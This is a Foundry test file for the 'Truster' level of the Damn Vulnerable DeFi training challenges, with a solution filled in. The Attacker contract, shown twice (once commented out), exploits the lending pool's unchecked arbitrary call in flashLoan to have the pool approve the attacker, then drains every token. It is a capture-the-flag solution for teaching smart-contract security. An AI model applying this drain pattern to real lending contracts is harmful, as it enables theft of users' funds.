// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {TrusterLenderPool} from "../../src/truster/TrusterLenderPool.sol";

contract TrusterChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");
    
    uint256 constant TOKENS_IN_POOL = 1_000_000e18;

    DamnValuableToken public token;
    TrusterLenderPool public pool;
    Attacker attacker;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        // Deploy token
        token = new DamnValuableToken();

        // Deploy pool and fund it
        pool = new TrusterLenderPool(token);
        token.transfer(address(pool), TOKENS_IN_POOL);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(address(pool.token()), address(token));
        assertEq(token.balanceOf(address(pool)), TOKENS_IN_POOL);
        assertEq(token.balanceOf(player), 0);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_truster() public checkSolvedByPlayer {
        
        attacker = new Attacker(address(token),address(pool),player,recovery);
        
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player must have executed a single transaction
        assertEq(vm.getNonce(player), 1, "Player executed more than one tx");

        // All rescued funds sent to recovery account
        assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
        assertEq(token.balanceOf(recovery), TOKENS_IN_POOL, "Not enough tokens in recovery account");
    }
}

// contract Attacker {
//     DamnValuableToken public token;
//     TrusterLenderPool public pool;
//     uint256 constant TOKENS_IN_POOL = 1_000_000e18;
//     address player;
//     address recovery;

//     constructor(address A,address B,address C,address D) {
//         token = DamnValuableToken(A);
//         pool = TrusterLenderPool(B);
//         player = C;
//         recovery = D;
//         bytes memory data = abi.encodeWithSignature("approve(address,uint256)",address(this),TOKENS_IN_POOL);
//         pool.flashLoan(0,player,address(token),data);
//         token.transferFrom(address(pool),recovery,TOKENS_IN_POOL);
//     }
// }

// Attacker contract for the "Truster" level in Damn Vulnerable DeFi
// This contract exploits the lack of access control in the TrusterLenderPool's `flashLoan` function
// to drain all tokens from the pool by using the pool's own token approval mechanism.

contract Attacker {
    DamnValuableToken public token;          // The token being drained
    TrusterLenderPool public lendingPool;    // The vulnerable lending pool contract
    uint256 constant POOL_TOKEN_BALANCE = 1_000_000e18; // Total tokens in the pool
    address attacker;                        // Address of the attacker (player)
    address receiver;                        // Address to receive the drained tokens

    constructor(
        address _tokenAddress,          // Address of the DamnValuableToken
        address _lendingPoolAddress,    // Address of the TrusterLenderPool
        address _attacker,              // Address of the attacker
        address _receiver               // Address where stolen tokens are sent
    ) {
        token = DamnValuableToken(_tokenAddress);
        lendingPool = TrusterLenderPool(_lendingPoolAddress);
        attacker = _attacker;
        receiver = _receiver;

        // Encode the `approve` function call to approve this contract to spend the pool's tokens
        bytes memory approveData = abi.encodeWithSignature(
            "approve(address,uint256)", 
            address(this), 
            POOL_TOKEN_BALANCE
        );

        // Exploit the flashLoan function to approve this contract
        lendingPool.flashLoan(
            0,                  // Borrow 0 tokens (no actual loan needed)
            attacker,           // Attacker address
            address(token),     // Target contract (DamnValuableToken)
            approveData         // Encoded `approve` function call
        );

        // Transfer all tokens from the pool to the receiver address
        token.transferFrom(
            address(lendingPool), 
            receiver, 
            POOL_TOKEN_BALANCE
        );
    }
}
